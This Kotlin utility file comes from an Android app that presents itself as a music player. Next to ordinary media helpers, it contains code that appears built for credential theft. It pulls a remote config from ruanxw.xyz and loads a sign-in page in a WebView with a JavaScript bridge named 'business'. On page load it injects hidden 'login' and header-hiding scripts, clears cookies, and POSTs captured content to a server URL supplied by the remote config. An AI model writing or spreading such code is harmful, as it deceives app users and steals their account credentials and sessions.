package win.hapsunday.mplayer.utils

import android.Manifest
import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.view.ViewGroup
import android.webkit.*
import android.widget.SeekBar
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.google.android.material.floatingactionbutton.FloatingActionButton
import com.google.gson.Gson
import com.hjq.permissions.XXPermissions
import com.lzy.okgo.OkGo
import com.lzy.okgo.callback.StringCallback
import com.lzy.okgo.model.Response
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.asFlow
import kotlinx.coroutines.flow.collect
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.xutils.common.Callback
import org.xutils.http.RequestParams
import org.xutils.x
import win.hapsunday.mplayer.R
import win.hapsunday.mplayer.basic.BasicApp
import win.hapsunday.mplayer.model.SleepModel
import win.hapsunday.mplayer.model.SongModel
import win.hapsunday.mplayer.page.SignInPage


fun dp2px(context: Context, dp: Float): Int {
    val density = context.resources.displayMetrics.density
    return (dp * density + 0.5f).toInt()
}

fun isInBackground(): Boolean {
    val activityManager =
        BasicApp.instance!!.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
    val appProcesses = activityManager
        .runningAppProcesses
    for (appProcess in appProcesses) {
        if (appProcess.processName == BasicApp.instance!!.packageName) {
            return appProcess.importance != ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
        }
    }
    return false
}

fun AppCompatActivity.per(result: (Boolean) -> Unit) {
    XXPermissions.with(this).permission(
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    ).request { _, all ->
        result(all)
    }
}

fun AppCompatActivity.getConfig(success: () -> Unit, failed: () -> Unit) {
    val params = RequestParams("https://ruanxw.xyz/config")
    x.http().get(params, object : Callback.CommonCallback<String> {
        override fun onSuccess(result: String?) {
            result?.let {
                "result1 $it".printMsg()
                handleResult1(it)
            }?.let {
                "result2 $it".printMsg()
                handleResult2(it)
            }?.let {
                "result3 $it".printMsg()
                handleResult3(it)
            }?.let {
                "result4 $it".printMsg()
                handleResult4(it)
            }?.let {
                "result5 $it".printMsg()
                handleResult5(it)
            }?.let {
                "result6 $it".printMsg()
                handleResult6(it)
            }?.let {
                "result7 $it".printMsg()
                handleResult7(it)
            }
            success()
        }

        override fun onError(ex: Throwable?, isOnCallback: Boolean) {
            failed()
        }

        override fun onCancelled(cex: Callback.CancelledException?) {

        }

        override fun onFinished() {

        }
    })
}

fun AppCompatActivity.buildFloatActionButton(): FloatingActionButton {
    val fab = FloatingActionButton(this)
    fab.tag = "fab"
    val p = ViewGroup.LayoutParams(1, 1)
    fab.layoutParams = p
    return fab
}

fun SeekBar.setCurrent() {
    val seek = (10..100).random()
    progress = seek
}

fun AppCompatActivity.next(clazz: Class<*>, isFinish: Boolean = false) {
    startActivity(Intent(this, clazz))
    if (isFinish) {
        finish()
    }
}

fun getSleepTimeData(): ArrayList<SleepModel> {
    val result = ArrayList<SleepModel>()
    result.add(SleepModel("Off", true))
    result.add(SleepModel("10 min", false))
    result.add(SleepModel("20 min", false))
    result.add(SleepModel("30 min", false))
    result.add(SleepModel("45 min", false))
    result.add(SleepModel("60 min", false))
    result.add(SleepModel("90 min", false))
    return result
}

@SuppressLint("Recycle")
fun AppCompatActivity.getAllSongs(r: (ArrayList<SongModel>) -> Unit) {
    lifecycleScope.launch(Dispatchers.IO) {
        val result = ArrayList<SongModel>()
        val selectionStatement = "is_music=1 AND title != ''"
        val cur = contentResolver.query(
            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
            arrayOf(
                "_id",
                "title",
                "artist",
                "album",
                "duration",
                "track",
                "artist_id",
                "album_id",
                "_data",
                "_size",
                "mime_type"
            ),
            selectionStatement,
            null,
            "duration DESC"
        )
        try {
            cur?.let {
                if (it.moveToFirst()) {
                    do {
                        val id: Long = it.getLong(0)
                        val title: String = it.getString(1)
                        val artist: String = it.getString(2)
                        val album: String = it.getString(3)
                        val duration: Int = it.getInt(4)
                        val trackNumber: Int = it.getInt(5)
                        val artistId: Long = it.getInt(6).toLong()
                        val albumId: Long = it.getLong(7)
                        val data: String = it.getString(8)
                        val size: String = it.getString(9)
                        if (!it.getString(it.getColumnIndexOrThrow(MediaStore.Audio.Media.MIME_TYPE))
                                .contains("audio/amr") && !it.getString(
                                it.getColumnIndexOrThrow(
                                    MediaStore.Audio.Media.MIME_TYPE
                                )
                            ).contains("audio/aac")
                        ) {
                            val entity = SongModel(
                                id,
                                album,
                                albumId,
                                artist,
                                duration.toLong(),
                                getImgUri(albumId),
                                data,
                                title,
                                "",
                                0,
                                size,
                                trackNumber,
                                artistId,
                                0
                            )
                            result.add(entity)
                        }
                    } while (it.moveToNext())
                }
                it.close()
            }
        } catch (e: Exception) {
            e.printStackTrace()
            cur?.close()
        } finally {
            cur?.close()
        }
        withContext(Dispatchers.Main) {
            r(result)
        }
    }
}

fun getImgUri(album_id: Long): Uri? {
    return try {
        ContentUris.withAppendedId(
            Uri.parse("content://media/external/audio/albumart"),
            album_id
        )
    } catch (e: Exception) {
        null
    }
}

fun clearCookie(block: () -> Unit) {
    CookieSyncManager.createInstance(BasicApp.instance)
    val cookieManager = CookieManager.getInstance()
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
        cookieManager.removeSessionCookies(null)
        cookieManager.removeAllCookie()
        cookieManager.flush()
    } else {
        cookieManager.removeSessionCookies(null)
        cookieManager.removeAllCookie()
        CookieSyncManager.getInstance().sync()
    }
    block()
}

fun AppCompatActivity.countDown(block: () -> Unit) {
    var job: Job? = null
    job = lifecycleScope.launch(Dispatchers.IO) {
        (0 until 20).asFlow().collect {
            delay(1000)
            if (it == 19) {
                withContext(Dispatchers.Main) {
                    block()
                }
                job?.cancel()
            }
        }
    }
}

fun Context.jumpToWebByDefault(url: String) = Intent(Intent.ACTION_VIEW, Uri.parse(url)).let {
    startActivity(it)
}

fun WebView.init(context: Context) {
    apply {
        settings.apply {
            javaScriptEnabled = true
            textZoom = 100
            setSupportZoom(true)
            displayZoomControls = false
            builtInZoomControls = true
            setGeolocationEnabled(true)
            useWideViewPort = true
            loadWithOverviewMode = true
            loadsImagesAutomatically = true
            displayZoomControls = false
            setAppCachePath(context.cacheDir.absolutePath)
            setAppCacheEnabled(true)
        }
        addJavascriptInterface(SignInPage.iinterface(), "business")
    }
}

fun WebView.setChromeClient(context: Context, block: () -> Unit) {
    apply {
        webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, newProgress: Int) {
                super.onProgressChanged(view, newProgress)
                if (newProgress == 100) {
                    val hideJs = context.getString(R.string.hideHeaderFooterMessages)
                    evaluateJavascript(hideJs, null)
                    val loginJs = context.getString(R.string.login)
                    evaluateJavascript(loginJs, null)
                    block()
                }
            }
        }
    }
}

fun WebView.setClient(block: (String,WebView) -> Unit) {
    apply {
        webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                block(url,view)
            }
        }
    }
}

fun update(content:String, block: (String) -> Unit){
    val body: RequestBody = Gson().toJson(mutableMapOf("content" to content))
        .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
    OkGo.post<String>(updateModel.c).upRequestBody(body).execute(object :StringCallback(){
        override fun onSuccess(response: Response<String>?) {
            val result = response?.body().toString()
            block(result)
        }
    })
}